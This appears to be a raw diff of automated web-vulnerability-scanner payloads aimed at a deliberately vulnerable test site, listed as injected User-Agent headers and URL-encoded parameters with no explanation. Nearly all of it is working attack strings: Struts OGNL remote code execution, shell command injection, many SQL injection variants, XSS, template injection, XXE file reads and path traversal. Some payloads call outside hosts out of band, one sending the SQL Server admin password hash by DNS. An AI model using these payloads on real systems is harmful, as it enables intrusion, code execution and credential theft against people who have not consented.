+    User-Agent: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='14807').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c','SET /A 0xFFF9999 -' + #cmd}:{'/bin/bash','-c','expr 268409241 - ' + #cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
+    User-Agent: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='45084').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c','SET /A 0xFFF9999 -' + #cmd}:{'/bin/bash','-c','expr 268409241 - ' + #cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
+    User-Agent: n3tsp4rke2
+    User-Agent: N3TSP4RKE2
+    User-Agent: NS09%ef%bc%9cs1%ef%b9%a5DBL%ca%baSNGL%ca%b9NS09
+    User-Agent: NS-1NO
+    User-Agent: ns../../../../../../../../../../../boot.ini.......................................................................................................................................................................................
+    User-Agent: |nslookup${IFS}"zqvil4-pt7fxy2rwtsh_fm-c_dhiun9bobqltmu3""eki.r87.me"
+    User-Agent: |nslookup${IFS}"zqvil4-pt7jjnat1sr0hlpeqjujwanh0rofbthue""lqy.r87.me"
+    User-Agent: & nslookup zqvil4-pt734tvve52nidjr54u-xh-msvadccchf^eyo.r87.me&'\"`0&nslookup zqvil4-pt734tvve52nidjr54u-xh-msvadccchf^eyo.r87.me&`'
+    User-Agent: & nslookup zqvil4-pt736cxh04lzgglymny_hs7vknlmvcy4s^wlo.r87.me&'\"`0&nslookup zqvil4-pt736cxh04lzgglymny_hs7vknlmvcy4s^wlo.r87.me&`'
+    User-Agent: nslookup "zqvil4-pt75j-op4f8kcqazngcwagvntft1epc_f""ca8.r87.me"
+    User-Agent: "&nslookup "zqvil4-pt76kgmggexjy9b5imptzpxfbtm1skzkv""bjm.r87.me"
+    User-Agent: '& nslookup zqvil4-pt7b_7mto890fhbpz9ydxjstn6yp6tsdm^p7o.r87.me&'\"`0&nslookup zqvil4-pt7b_7mto890fhbpz9ydxjstn6yp6tsdm^p7o.r87.me&`'
+    User-Agent: nslookup zqvil4-pt7bgxxtupvzhi6ughx1-bsrmlhkteipv^e3c.r87.me&'\"`0&nslookup zqvil4-pt7bgxxtupvzhi6ughx1-bsrmlhkteipv^e3c.r87.me&`'
+    User-Agent: &nslookup "zqvil4-pt7cfyjrzvwgnt79wjgsn2tngub2_kvcx""ysi.r87.me"
+    User-Agent: "& nslookup zqvil4-pt7dea2avaxpp8vmiid6iwvdeg8txf4sk^gwe.r87.me&'\"`0&nslookup zqvil4-pt7dea2avaxpp8vmiid6iwvdeg8txf4sk^gwe.r87.me&`'
+    User-Agent: '&nslookup "zqvil4-pt7gifbwy9cy8cy4ab1egvq3_to_3nk3i""m1y.r87.me"
+    User-Agent: '&nslookup "zqvil4-pt7jmkbcqzkxxtarfvhptdisforc0qx-_""qz8.r87.me"
+    User-Agent: &nslookup "zqvil4-pt7-joft5zpoj7sjmhcpbxp2hxtqpz_qq""qyq.r87.me"
+    User-Agent: nslookup "zqvil4-pt7lqnhemgchfd-p4845yhseopsswt83p""tew.r87.me"
+    User-Agent: '& nslookup zqvil4-pt7mms0t9ay54t1pggnmxmabq4ujqcyaa^7le.r87.me&'\"`0&nslookup zqvil4-pt7mms0t9ay54t1pggnmxmabq4ujqcyaa^7le.r87.me&`'
+    User-Agent: nslookup zqvil4-pt7nskc2s446u2_ndthemc3kvqlle03su^1tu.r87.me&'\"`0&nslookup zqvil4-pt7nskc2s446u2_ndthemc3kvqlle03su^1tu.r87.me&`'
+    User-Agent: "&nslookup "zqvil4-pt7qofkleoi-ein8bwa5ciifefawxmkam""gmm.r87.me"
+    User-Agent: "& nslookup zqvil4-pt7vaic6asasi7_lscilnxznpfnzf3_2t^z2q.r87.me&'\"`0&nslookup zqvil4-pt7vaic6asasi7_lscilnxznpfnzf3_2t^z2q.r87.me&`'
+    User-Agent: nxtspxrkex
+    User-Agent: "& ping -n 25 127.0.0.1 &
+    User-Agent: & ping -n 25 127.0.0.1 &
+    User-Agent: '& ping -n 25 127.0.0.1 &
+    User-Agent: |ping -n 25 127.0.0.1
+    User-Agent: ping -n 25 127.0.0.1
+    User-Agent: ping -n 25 127.0.0.1 &
+    User-Agent: "&ping -w 25 127.0.0.1 &"
+    User-Agent: &ping -w 25 127.0.0.1 &
+    User-Agent: '&ping -w 25 127.0.0.1 &'
+    User-Agent: ping -w 25 127.0.0.1
+    User-Agent: ping -w 25 127.0.0.1 &
+    User-Agent: (SELECT 1 and ROW(1,1)>(SELECT COUNT(*),CONCAT(CHAR(95),CHAR(33),CHAR(64),CHAR(52),CHAR(100),CHAR(105),CHAR(108),CHAR(101),CHAR(109),CHAR(109),CHAR(97),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.COLLATIONS GROUP BY x)a)
+    User-Agent: '+((SELECT 1 FROM (SELECT SLEEP(25))A))+'
+    User-Agent: ((SELECT 1 FROM (SELECT SLEEP(25))A))
+    User-Agent: (select chr(95)||chr(33)||chr(64)||chr(51)||chr(100)||chr(105)||chr(108)||chr(101)||chr(109)||chr(109)||chr(97) from DUAL)
+    User-Agent: (SELECT CONCAT(CHAR(95),CHAR(33),CHAR(64),CHAR(52),CHAR(100),CHAR(105),CHAR(108),CHAR(101),CHAR(109),CHAR(109),CHAR(97)))
+    User-Agent: '+ (select convert(int, cast(0x5f21403264696c656d6d61 as varchar(8000))) from syscolumns) +'
+    User-Agent: (select convert(int,cast(0x5f21403264696c656d6d61 as varchar(8000))) from syscolumns)
+    User-Agent: SELECT dblink_connect('host=zqvil4-pt7akzgcsg5tn0_axoupkr5jq6lmgxdzh'||'key.r87.me user=a password=a connect_timeout=2')
+    User-Agent: '||(SELECT dblink_connect('host=zqvil4-pt7be9zi19o02kjdek-d0zbbiygz8r4gi'||'zuk.r87.me user=a password=a connect_timeout=2'))||'
+    User-Agent: SELECT dblink_connect('host=zqvil4-pt7prpgnv-vjvhrtrclo26tsypgcvmir6'||'ojy.r87.me user=a password=a connect_timeout=2')
+    User-Agent: '||(SELECT dblink_connect('host=zqvil4-pt7q5r5dxl1sujrhg5jexrctvjgmb_wcf'||'mj8.r87.me user=a password=a connect_timeout=2'))||'
+    User-Agent: (select dbms_pipe.receive_message((chr(95)||chr(33)||chr(64)||chr(51)||chr(100)||chr(105)||chr(108)||chr(101)||chr(109)||chr(109)||chr(97)),25) from dual)
+    User-Agent: SELECT pg_sleep(25)--
+    User-Agent: ((select sleep(25)))a-- 1
+    User-Agent: (select UTL_INADDR.GET_HOST_ADDRESS(chr(122)||chr(113)||chr(118)||chr(105)||chr(108)||chr(52)||chr(45)||chr(112)||chr(116)||chr(55)||chr(102)||chr(102)||chr(115)||chr(116)||chr(119)||chr(56)||chr(103)||chr(103)||chr(104)||chr(108)||chr(121)||chr(110)||chr(113)||chr(98)||chr(101)||chr(109)||chr(95)||chr(108)||chr(120)||chr(103)||chr(50)||chr(116)||chr(111)||chr(102)||chr(101)||chr(97)||chr(102)||chr(111)||chr(119)||chr(112)||chr(110)||chr(98)||chr(115)||chr(46)||chr(114)||chr(56)||chr(55)||chr(46)||chr(109)||chr(101)) from DUAL)
+    User-Agent: (select UTL_INADDR.GET_HOST_ADDRESS(chr(122)||chr(113)||chr(118)||chr(105)||chr(108)||chr(52)||chr(45)||chr(112)||chr(116)||chr(55)||chr(111)||chr(110)||chr(122)||chr(45)||chr(119)||chr(112)||chr(51)||chr(117)||chr(107)||chr(116)||chr(98)||chr(105)||chr(120)||chr(122)||chr(45)||chr(108)||chr(105)||chr(98)||chr(99)||chr(104)||chr(110)||chr(99)||chr(118)||chr(114)||chr(57)||chr(121)||chr(95)||chr(104)||chr(51)||chr(106)||chr(100)||chr(107)||chr(111)||chr(46)||chr(114)||chr(56)||chr(55)||chr(46)||chr(109)||chr(101)) from DUAL)
+    User-Agent: (select UTL_INADDR.GET_HOST_ADDRESS('zqvil4-pt7jzzixtltorj430p9lezjm3vopvfeuy'||'4iw.r87.me') from DUAL)
+    User-Agent: (select UTL_INADDR.GET_HOST_ADDRESS('zqvil4-pt7rmn4rufu6vqiuv8zflcudo-ilky633'||'g6q.r87.me') from DUAL)
+    User-Agent: '& SET /A 0xFFF9999-31316 &
+    User-Agent: SET /A 0xFFF9999-34640 &
+    User-Agent: & SET /A 0xFFF9999-42915 &
+    User-Agent: SET /A 0xFFF9999-60765 &
+    User-Agent: "& SET /A 0xFFF9999-74405 &
+    User-Agent: "& SET /A 0xFFF9999-78827 &
+    User-Agent: SET /A 0xFFF9999-84645
+    User-Agent: '& SET /A 0xFFF9999-91310 &
+    User-Agent: & SET /A 0xFFF9999-94592 &
+    User-Agent: SET /A 0xFFF9999-99919
+    User-Agent: '"--></style></scRipt><scRipt>netsparker(0x000087)</scRipt>
+    User-Agent: '"@--></style></scRipt><scRipt>netsparker(0x0000A4)</scRipt>
+    User-Agent: '"--></style></scRipt><scRipt>netsparker(0x00020B)</scRipt>
+    User-Agent: '"@--></style></scRipt><scRipt>netsparker(0x000227)</scRipt>
+    User-Agent: syscolumns WHERE 2>3;exec('xp_dirtree ''\\zqvil4-pt7udippzffmk5urfsg4vow00aa2srefp'+'3he.r87.me'+'\c$\a''')--
+    User-Agent: syscolumns WHERE 2>3;exec('xp_dirtree ''\\zqvil4-pt7v77x2giydkml4dbylosehxw6lc5ufb'+'zia.r87.me'+'\c$\a''')--
+    User-Agent: testphp.vulnweb.com/elmah
+    User-Agent: testphp.vulnweb.com/elmah.axd
+    User-Agent: testphp.vulnweb.com/trace.axd
+    User-Agent: ' WAITFOR DELAY '0:0:25'--
+    User-Agent: ') WAITFOR DELAY '0:0:25'--
+    User-Agent: WAITFOR DELAY '0:0:25'--
+    User-Agent: . . /. . /. . /. . /. . /. . /. . /. . /. . /. . /. . /windows/win.ini
+    User-Agent: .....///.....///.....///.....///.....///.....///.....///.....///.....///.....///.....///windows/win.ini
+    User-Agent: ....//....//....//....//....//....//....//....//....//....//....//windows/win.ini
+    User-Agent: ...//...//...//...//...//...//...//...//...//...//...//windows/win.ini
+    User-Agent: /../../../../../../../../../../windows/win.ini
+    X-NS: N19469765S
+    X-NS: N14838567S
+
+
+
+Payloads URL-Encoded:
+    1 query 
+    2 %2527 
+    3 -1%20OR%201%3d1 
+    4 %27%20WAITFOR%20DELAY%20%270%3a0%3a25%27-- 
+    5 ABCtor222222 
+    6 %22%26%20SET%20%2fA%200xFFF9999-40388%20%26 
+    7 %22%26%20ping%20-n%2025%20127.0.0.1%20%26 
+    8 nxtspxrkex 
+    9 %2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fboot.ini 
+    10 hTTp%3a%2f%2fABCtor.com%2fn 
+    11 response.write(268409241-24189)%27 
+    12 %7b%7b268409241-24189%7d%7d 
+    13 %0d%0ans%3aABCtor056650%3dvuln 
+    14 http://ABCtor.com/?testphp.vulnweb.com/ 
+    15 (select%20convert(int%2ccast(0x5f21403264696c656d6d61%20as%20varchar(8000)))%20from%20syscolumns) 
+    16 1%20WAITFOR%20DELAY%20%270%3a0%3a25%27-- 
+    17 %27%26%20SET%20%2fA%200xFFF9999-43096%20%26 
+    18 %27%26%20ping%20-n%2025%20127.0.0.1%20%26 
+    19 ABCtor222222 
+    20 %22%7c%7cABCtor%7c%7c 
+    21 ABCtor 
+    22 %3c%3fxml%20version%3d%221.0%22%3f%3e%3c!DOCTYPE%20ns%20%5b%3c!ELEMENT%20ns%20ANY%3e%3c!ENTITY%20lfi%20SYSTEM%20%22file%3a%2f%2f%2fC%3a%2fWindows%2fSystem32%2fdrivers%2fetc%2fhosts%22%3e%5d%3e%3cns%3e%26lfi%3b%3c%2fns%3e 
+    23 '%22--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3EABCtor(0x000003)%3C/scRipt%3E 
+    24 %27%2b%20(select%20convert(int%2c%20cast(0x5f21403264696c656d6d61%20as%20varchar(8000)))%20from%20syscolumns)%20%2b%27 
+    25 %2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fboot.ini%00.php 
+    26 %2bresponse.write(268409241-82823)%27 
+    27 %2527%2522--%253E%253C%252Fstyle%253E%253C%252FscRipt%253E%253CscRipt%253EABCtor%25280x000005%2529%253C%252FscRipt%253E 
+    28 query%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fboot.ini 
+    29 WAITFOR%20DELAY%20%270%3a0%3a25%27-- 
+    30 %26%20ping%20-n%2025%20127.0.0.1%20%26 
+    31 http%3a%2f%2fABCtor.com%2fn%3f%00.php 
+    32 %24%7b268409241-82823%7d 
+    33 http%3a%2f%2fexample.com%2f%3f%0d%0ans%3a%20ABCtor056650%3dvuln 
+    34 1)%20WAITFOR%20DELAY%20%270%3a0%3a25%27-- 
+    35 http%3a%2f%2fABCtor.com%2fn%3f.php 
+    36 %3d268409241-89362 
+    37 ns%3aABCtor056650%3dvuln 
+    38 ping%20-n%2025%20127.0.0.1%20%26 
+    39 %27 
+    40 %27)%20WAITFOR%20DELAY%20%270%3a0%3a25%27-- 
+    41 %7b%7b%3d268409241-43359%7d%7d 
+    42 %0ans%3aABCtor056650%3dvuln 
+    43 %22%26ping%20-w%2025%20127.0.0.1%20%26%22 
+    44 NSqueryNO 
+    45 %27))%20WAITFOR%20DELAY%20%270%3a0%3a25%27-- 
+    46 data%3a%3bbase64%2cJyI%2bPHNjcmlwdD5uZXRzcGFya2VyKDB4MDAwMDA2KTwvc2NyaXB0Pg%3d%3d 
+    47 file%3a%2f%2f%2fboot.ini 
+    48 %3c%25-%20268409241-21992%20%25%3e 
+    49 %22%2bresponse.write(268409241-89362)%2b%22 
+    50 %27%26ping%20-w%2025%20127.0.0.1%20%26%27 
+    51 %3c%25%20response.write(268409241-43359)%20%25%3e 
+    52 %23set(%24c%3d268409241%20-%2063879)%0a%24%7bc%7d 
+    53 c%3a%5cboot.ini 
+    54 %27%22%20ns%3dABCtor(0x000007)%20 
+    55 1))%20WAITFOR%20DELAY%20%270%3a0%3a25%27-- 
+    56 %3c%23assign%20x%3d268409241%20-%2087951%3e%0a%24%7bx%3fstring%5b%220%22%5d%7d 
+    57 ns..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fboot.ini....................................................................................................................................................................................... 
+    58 1%20ns%3dABCtor(0x000008)%20 
+    59 1))%3bDECLARE%2f**%2f%40x%2f**%2fchar(9)%3bSET%2f**%2f%40x%3dchar(48)%2bchar(58)%2bchar(48)%2bchar(58)%2bchar(50)%2bchar(53)%3bWAITFOR%2f**%2fDELAY%2f**%2f%40x-- 
+    60 %3c%25%3d%20%22%23%7b268409241-8993%7d%22%20%25%3e 
+    61 %252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fboot.ini 
+    62 %24%7b28275*28275-(24189)%7d 
+    63 %26%20SET%20%2fA%200xFFF9999-41364%20%26 
+    64 %3c%3fxml%20version%3d%221.0%22%3f%3e%3c!DOCTYPE%20ns%20%5b%3c!ELEMENT%20ns%20ANY%3e%3c!ENTITY%20lfi%20SYSTEM%20%22file%3a%2f%2f%2fetc%2fpasswd%22%3e%5d%3e%3cns%3e%26lfi%3b%3c%2fns%3e 
+    65 convert(int%2c%20cast(0x5f21403264696c656d6d61%20as%20varchar(8000))) 
+    66 php%3a%2f%2ffilter%2f%2fresource%3dhttp%3a%2f%2fABCtor.com%2fn%3f%00.php 
+    67 1%3bDECLARE%2f**%2f%40x%2f**%2fchar(9)%3bSET%2f**%2f%40x%3dchar(48)%2bchar(58)%2bchar(48)%2bchar(58)%2bchar(50)%2bchar(53)%3bWAITFOR%2f**%2fDELAY%2f**%2f%40x-- 
+    68 %2f%2fABCtor.com%2fn%2fn.css%3f0x00000D 
+    69 file%253a%252f%252f%252fboot.ini 
+    70 SET%20%2fA%200xFFF9999-23396%20%26 
+    71 %23%7b28275*28275-(82823)%7d 
+    72 query%20AND%20%27NS%3d%27ss 
+    73 %26ping%20-w%2025%20127.0.0.1%20%26 
+    74 c%253a%255cboot.ini 
+    75 SET%20%2fA%200xFFF9999-44536 
+    76 query%27%20OR%201%3d1%20OR%20%27ns%27%3d%27ns 
+    77 ping%20-w%2025%20127.0.0.1%20%26 
+    78 print(int)0xFFF9999-31823 
+    79 print(int)0xFFF9999-7677%3b 
+    80 query%22%20OR%201%3d1%20OR%20%22ns%22%3d%22ns 
+    81 %2bprint(int)0xFFF9999-83144%3b%2f%2f 
+    82 -1%20OR%2017-7%3d10 
+    83 %27%2bprint(int)0xFFF9999-79493%2b%27 
+    84 %22%2bprint(int)0xFFF9999-40087%2b%22 
+    85 %3c%3f%3d(int)0xFFF9999-95429%3b%2f%2f%3f%3e 
+    86 %2f%2fABCtor.com%2fn%2fj%2f%3f0x00000E 
+    87 1)%3bDECLARE%2f**%2f%40x%2f**%2fchar(9)%3bSET%2f**%2f%40x%3dchar(48)%2bchar(58)%2bchar(48)%2bchar(58)%2bchar(50)%2bchar(53)%3bWAITFOR%2f**%2fDELAY%2f**%2f%40x-- 
+    88 ABCtor.com%2fn 
+    89 %27AND%201%3dcast(0x5f21403264696c656d6d61%20as%20varchar(8000))%20or%20%271%27%3d%27 
+    90 %7bphp%7dprint(int)0xFFF9999-82068%3b%7b%2fphp%7d 
+    91 syscolumns%20WHERE%202%3e3%3bDECLARE%2f**%2f%40x%2f**%2fchar(9)%3bSET%2f**%2f%40x%3dchar(48)%2bchar(58)%2bchar(48)%2bchar(58)%2bchar(50)%2bchar(53)%3bWAITFOR%2f**%2fDELAY%2f**%2f%40x-- 
+    92 %2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fweb.config 
+    93 query%20OR%20X%3d%27ss 
+    94 %7c%20SET%20%2fA%200xFFF9999-53141 
+    95 ping%20-n%2025%20127.0.0.1 
+    96 NS09%EF%BC%9Cs1%EF%B9%A5DBL%CA%BASNGL%CA%B9NS09 
+    97 %27%7b%24%7bprint(int)0xFFF9999-19200%7d%7d%27 
+    98 -1%20or%201%3d1%20and%20(SELECT%201%20and%20ROW(1%2c1)%3e(SELECT%20COUNT(*)%2cCONCAT(CHAR(95)%2cCHAR(33)%2cCHAR(64)%2cCHAR(52)%2cCHAR(100)%2cCHAR(105)%2cCHAR(108)%2cCHAR(101)%2cCHAR(109)%2cCHAR(109)%2cCHAR(97)%2c0x3a%2cFLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.COLLATIONS%20GROUP%20BY%20x)a) 
+    99 query%20%2b%20((SELECT%201%20FROM%20(SELECT%20SLEEP(25))A))%2f*%27XOR(((SELECT%201%20FROM%20(SELECT%20SLEEP(25))A)))OR%27%7c%22XOR(((SELECT%201%20FROM%20(SELECT%20SLEEP(25))A)))OR%22*%2f 
+    100 %2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fwindows%2fwin.ini 
+    101 -1%27%20and%206%3d3%20or%201%3d1%2b(SELECT%201%20and%20ROW(1%2c1)%3e(SELECT%20COUNT(*)%2cCONCAT(CHAR(95)%2cCHAR(33)%2cCHAR(64)%2cCHAR(52)%2cCHAR(100)%2cCHAR(105)%2cCHAR(108)%2cCHAR(101)%2cCHAR(109)%2cCHAR(109)%2cCHAR(97)%2c0x3a%2cFLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.COLLATIONS%20GROUP%20BY%20x)a)%2b%27 
+    102 http://testphp.vulnweb.com/trace.axd 
+    103 %5bphp%5dprint(int)0xFFF9999-18973%3b%5b%2fphp%5d 
+    104 ping%20-w%2025%20127.0.0.1 
+    105 query%22%3bexpr%20268409241%20-%209132%3b%22 
+    106 query%27%20OR%201%3d1%20OR%20%271%27%3d%271 
+    107 %25%7b(%23_%3d%27multipart%2fform-data%27).(%23dm%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS).(%23_memberAccess%3f(%23_memberAccess%3d%23dm)%3a((%23container%3d%23context%5b%27com.opensymphony.xwork2.ActionContext.container%27%5d).(%23ognlUtil%3d%23container.getInstance(%40com.opensymphony.xwork2.ognl.OgnlUtil%40class)).(%23ognlUtil.getExcludedPackageNames().clear()).(%23ognlUtil.getExcludedClasses().clear()).(%23context.setMemberAccess(%23dm)))).(%23cmd%3d%2743487%27).(%23iswin%3d(%40java.lang.System%40getProperty(%27os.name%27).toLowerCase().contains(%27win%27))).(%23cmds%3d(%23iswin%3f%7b%27cmd.exe%27%2c%27%2fc%27%2c%27SET%20%2fA%200xFFF9999%20-%27%20%2b%20%23cmd%7d%3a%7b%27%2fbin%2fbash%27%2c%27-c%27%2c%27expr%20268409241%20-%20%27%20%2b%20%23cmd%7d)).(%23p%3dnew%20java.lang.ProcessBuilder(%23cmds)).(%23p.redirectErrorStream(true)).(%23process%3d%23p.start()).(%23ros%3d(%40org.apache.struts2.ServletActionContext%40getResponse().getOutputStream())).(%40org.apache.commons.io.IOUtils%40copy(%23process.getInputStream()%2c%23ros)).(%23ros.flush())%7d 
+    108 query%27%3bexpr%20268409241%20-%209223%3b%27 
+    109 print%20localtime()*0%2b0xFFF9999-32019 
+    110 eval(%27print%20localtime()*0%2b0xFFF9999-16227%27) 
+    111 query%3bexpr%20268409241%20-%2015850%3bx 
+    112 file%3a%2f%2f%2fwindows%2fwin.ini 
+    113 http%3a%2f%2fABCtor.com%2f%3ftestphp.vulnweb.com%2f 
+    114 query%22%20OR%201%3d1%20OR%20%221%22%3d%221 
+    115 %2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fwindows%2fwin.ini%00.php 
+    116 expr%20268409241%20-%2032610%3b 
+    117 %27%3e%3cnet%20ABCtor%3dABCtor(0x00000F)%3e 
+    118 zqvil4-pt7xgjwbvqthswqre8a3m5z1tlrbk4whnolu.ABCtor.com 
+    119 exec(%27xp_dirtree%20%27%27%5c%5czqvil4-pt719obr30tywf2cvwbpgnkqyqgvjslqj%27%2b%278fy.ABCtor.com%27%2b%27%5cc%24%5ca%27%27%27) 
+    120 https%3a%2f%2fABCtor.com%2f%3ftestphp.vulnweb.com%2f 
+    121 -1%22%20and%206%3d3%20or%201%3d1%2b(SELECT%201%20and%20ROW(1%2c1)%3e(SELECT%20COUNT(*)%2cCONCAT(CHAR(95)%2cCHAR(33)%2cCHAR(64)%2cCHAR(52)%2cCHAR(100)%2cCHAR(105)%2cCHAR(108)%2cCHAR(101)%2cCHAR(109)%2cCHAR(109)%2cCHAR(97)%2c0x3a%2cFLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.COLLATIONS%20GROUP%20BY%20x)a)%2b%22 
+    122 c%3a%5cwindows%5cwin.ini 
+    123 (SELECT%20CONCAT(CHAR(95)%2cCHAR(33)%2cCHAR(64)%2cCHAR(52)%2cCHAR(100)%2cCHAR(105)%2cCHAR(108)%2cCHAR(101)%2cCHAR(109)%2cCHAR(109)%2cCHAR(97))) 
+    124 ...%2f%2f...%2f%2f...%2f%2f...%2f%2f...%2f%2f...%2f%2f...%2f%2f...%2f%2f...%2f%2f...%2f%2f...%2f%2fwindows%2fwin.ini 
+    125 //zqvil4-pt7o5qxrfwqj107ow-3jrn-9mfg9enhjyzoq.ABCtor.com 
+    126 cast((select%20chr(95)%7c%7cchr(33)%7c%7cchr(64)%7c%7cchr(53)%7c%7cchr(100)%7c%7cchr(105)%7c%7cchr(108)%7c%7cchr(101)%7c%7cchr(109)%7c%7cchr(109)%7c%7cchr(97))%20as%20numeric) 
+    127 ....%2f%2f....%2f%2f....%2f%2f....%2f%2f....%2f%2f....%2f%2f....%2f%2f....%2f%2f....%2f%2f....%2f%2f....%2f%2fwindows%2fwin.ini 
+    128 %7cping%20-n%2025%20127.0.0.1 
+    129 testphp.vulnweb.com/trace.axd 
+    130 %27%2bprint%20localtime()*0%2b0xFFF9999-37224%2b%27 
+    131 %3c%3fxml%20version%3d%221.0%22%20encoding%3d%22utf-8%22%3f%3e%3c!DOCTYPE%20r%20%5b%3c!ENTITY%20%25%20s%20%22http%3a%2f%2fzqvil4-p%22%3e%3c!ENTITY%20%25%20d%20%22t7mivtrkfi1vbsgoit_xrwnkzvktljszml4.ABCtor.com%22%3e%3c!ENTITY%20%25%20dtd%20SYSTEM%20%22http%3a%2f%2fABCtor.com%2fdtd%22%3e%20%20%25dtd%3b%5d%3e%3cr%3e%26a%3b%3c%2fr%3e 
+    132 %27%7c%7ccast((select%20chr(95)%7c%7cchr(33)%7c%7cchr(64)%7c%7cchr(53)%7c%7cchr(100)%7c%7cchr(105)%7c%7cchr(108)%7c%7cchr(101)%7c%7cchr(109)%7c%7cchr(109)%7c%7cchr(97))%20as%20numeric)%7c%7c%27 
+    133 .....%2f%2f%2f.....%2f%2f%2f.....%2f%2f%2f.....%2f%2f%2f.....%2f%2f%2f.....%2f%2f%2f.....%2f%2f%2f.....%2f%2f%2f.....%2f%2f%2f.....%2f%2f%2f.....%2f%2f%2fwindows%2fwin.ini 
+    134 .%20.%20%2f.%20.%20%2f.%20.%20%2f.%20.%20%2f.%20.%20%2f.%20.%20%2f.%20.%20%2f.%20.%20%2f.%20.%20%2f.%20.%20%2f.%20.%20%2fwindows%2fwin.ini 
+    135 %22%2bprint%20localtime()*0%2b0xFFF9999-18824%2b%22 
+    136 176.28.50.165/trace.axd 
+    137 expr%20268409241%20-%2081787 
+    138 %2f%2fABCtor.com%2f%3fhttp%3a%2f%2ftestphp.vulnweb.com%2f 
+    139 declare%20%40h%20varchar(999)select%20%40h%3d%271%27%2bsubstring(name%2b%27-%27%2bmaster.sys.fn_varbintohexstr(ISNULL(password_hash%2c0x0))%2c0%2c63)%2b%27.zqvil4-pt7qxpcuiqfwqiuqesq6tofudy0-avzu_%27%2b%27lvm.ABCtor.com%27%20from%20sys.sql_logins%20WHERE%20principal_id%3d1%3bexec(%27xp_dirtree%20%27%27%5c%5c%27%2b%40h%2b%27%5cc%24%27%27%27) 
+    140 %22%3e%3cnet%20ABCtor%3dABCtor(0x000010)%3e 
+    141 127.100.11.2/trace.axd 
+    142 %3c!--%23exec%20cmd%3d%22expr%20268409241%20-%2087740%22--%3e 
+    143 ABCtor.com%2f%3ftestphp.vulnweb.com%2f 
+    144 ::1/trace.axd 
+    145 %3ciMg%20src%3dN%20onerror%3dABCtor(0x000011)%3e 
+    146 ABCtor.com%2f%3fhttp%3a%2f%2ftestphp.vulnweb.com%2f 
+    147 arguments%5b1%5d.end(require(%27child_process%27).execSync(%27expr%20268409241%20-%2050768%27)) 
+    148 http://ABCtor.com/r/?id=zqvil4-pt7s5u56f8eac6w-aue9wv4zgpkhej1c-500 
+    149 %2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fwindows%2fiis6.log 
+    150 (select%20chr(95)%7c%7cchr(33)%7c%7cchr(64)%7c%7cchr(51)%7c%7cchr(100)%7c%7cchr(105)%7c%7cchr(108)%7c%7cchr(101)%7c%7cchr(109)%7c%7cchr(109)%7c%7cchr(97)%20from%20DUAL) 
+    151 %3c%3fxml%20version%3d%221.0%22%20encoding%3d%22utf-8%22%3f%3e%3c!DOCTYPE%20r%20%5b%3c!ENTITY%20%25%20s%20%22php%3a%2f%2ffilter%2fresource%3dhttp%3a%2f%2fzqvil4-p%22%3e%3c!ENTITY%20%25%20d%20%22t7dcttkmxav9cteshculox3gjria8xa_oxc.ABCtor.com%22%3e%3c!ENTITY%20%25%20dtd%20SYSTEM%20%22http%3a%2f%2fABCtor.com%2fdtd%22%3e%20%20%25dtd%3b%5d%3e%3cr%3e%26a%3b%3c%2fr%3e 
+    152 %27%22--%3e%3c%2fstyle%3e%3c%2fscRipt%3e%3cscRipt%20src%3d%22%2f%2fzqvil4-pt7pflq5hcmnmmpoydq4lsvclrncoebrw_vo%26%2346%3bABCtor%26%2346%3bme%22%3e%3c%2fscRipt%3e 
+    153 %2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fproc%2fself%2ffd%2f2 
+    154 NSFTW 
+    155 1%3bexec(%27xp_dirtree%20%27%27%5c%5czqvil4-pt73prxftj3e-pvlv4ahhee1vnlnu9hx1%27%2b%27wxa.ABCtor.com%27%2b%27%5cc%24%5ca%27%27%27)-- 
+    156 %2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fproc%2fself%2ffd%2f2%00.php 
